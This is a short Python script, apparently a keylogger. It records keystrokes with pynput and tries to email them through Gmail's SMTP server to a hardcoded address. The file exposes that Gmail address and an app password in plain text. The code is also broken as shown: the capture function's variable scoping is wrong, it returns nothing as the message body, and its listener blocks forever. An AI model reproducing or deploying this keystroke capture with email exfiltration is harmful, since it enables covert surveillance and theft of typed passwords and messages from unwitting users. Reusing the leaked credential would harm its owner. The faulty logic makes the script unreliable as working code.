import smtplib
from pynput import keyboard
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def function_call():
    result = ""

    def on_press(key):
        global result
        try:
            result=result+key.char

        except AttributeError:
            reskey = key
            if (str(reskey) == "Key.space"):
                result = result + " "
                print(result)
            else:
                result = result + " " + str(reskey) + " "
                print(result)
            return result


    with keyboard.Listener(on_press=on_press) as Listner:
        Listner.join()

    

# Email credentials
sender_email = "mperarasu10@gmail.com"
receiver_email = "mperarasu10@gmail.com"
password = "bswltvlfmnhnckaa"

# Email content
subject = "Test Email"
body = function_call()

# Create a MIMEText object
msg = MIMEMultipart()
msg['From'] = sender_email
msg['To'] = receiver_email
msg['Subject'] = subject

# Attach the body with the msg instance
msg.attach(MIMEText(body, 'plain'))

# SMTP server configuration
smtp_server = "smtp.gmail.com"
port = 465  # For SSL

# Create a secure SSL context
print("Creating SSL context...")
context = smtplib.ssl.create_default_context()

try:
    print("Connecting to the server...")
    with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
        print("Connected to the server.")
        
        print("Logging in...")
        server.login(sender_email, password)
        print("Logged in successfully.")
        
        print("Sending email...")
        server.sendmail(sender_email, receiver_email, msg.as_string())
        print("Email sent successfully!")
        
except smtplib.SMTPConnectError:
    print("Failed to connect to the server. Wrong server address or port.")
except smtplib.SMTPAuthenticationError:
    print("Failed to authenticate. Wrong email or password.")
except smtplib.SMTPException as e:
    print(f"SMTP error occurred: {e}")
except Exception as e:
    print(f"An error occurred: {e}")


